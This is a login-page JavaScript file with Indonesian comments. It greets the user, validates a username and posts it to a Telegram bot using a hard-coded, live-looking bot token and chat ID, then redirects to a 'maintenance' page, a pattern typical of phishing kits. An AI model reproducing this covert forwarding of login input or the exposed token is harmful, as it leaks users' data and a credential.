document.addEventListener('DOMContentLoaded', () => {
    // Ambil elemen-elemen yang dibutuhkan
    const greetingElement = document.getElementById('greeting');
    const usernameInput = document.getElementById('username');
    const form = document.querySelector('form');

    // Tetapkan pesan greeting berdasarkan waktu
    const currentTime = new Date().getHours();
    let greeting;

    if (currentTime < 12) {
        greeting = 'Selamat pagi';
    } else if (currentTime < 15) {
        greeting = 'Selamat siang';
    } else if (currentTime < 18) {
        greeting = 'Selamat sore';
    } else {
        greeting = 'Selamat malam';
    }

    // Validasi input nama pengguna
    usernameInput.addEventListener('input', () => {
        const usernameValue = usernameInput.value.trim();
        const hasVowel = /[aeiouAEIOU]/.test(usernameValue); // Cek apakah ada huruf vokal
        const isValid = /^[a-zA-Z\s]{4,}$/.test(usernameValue) && hasVowel;

        if (!isValid) {
            usernameInput.setCustomValidity('Username must be at least 4 letters, contain only letters and spaces, and include at least one vowel.');
        } else {
            usernameInput.setCustomValidity('');
        }
    });

    // Tangani event submit form
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const usernameValue = usernameInput.value.trim();
        if (usernameValue) {
            // Simpan username di localStorage
            localStorage.setItem('username', usernameValue);

            // Tampilkan greeting nama pengguna sebelum menuju ke halaman maintenance
            greetingElement.textContent = `${greeting}, ${usernameValue}!`;

            // Kirim nama pengguna ke bot Telegram
            const token = '7387826039:AAGR6GjoVPi7MOCu8jJMG6p2FlvWXINUwBg'; // Ganti dengan token bot Telegram Anda
            const chatId = '-4535723634'; // Ganti dengan ID chat Anda
            const feedbackText = `User Logged In:\nUsername: ${usernameValue}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: feedbackText,
                }),
            });

            // Arahkan ke halaman maintenance setelah 2 detik
            setTimeout(() => {
                window.location.href = 'maintenance/maintenance.html'; // Ganti dengan nama file halaman maintenance jika perlu
            }, 2000);
        } else {
            alert('Please enter a valid username.');
        }
    });

    // Mengubah judul tab setiap detik
    const titles = ['Login Page', 'Welcome', 'Please Log In'];
    let titleIndex = 0;

    setInterval(() => {
        document.title = titles[titleIndex];
        titleIndex = (titleIndex + 1) % titles.length;
    }, 1000);
});
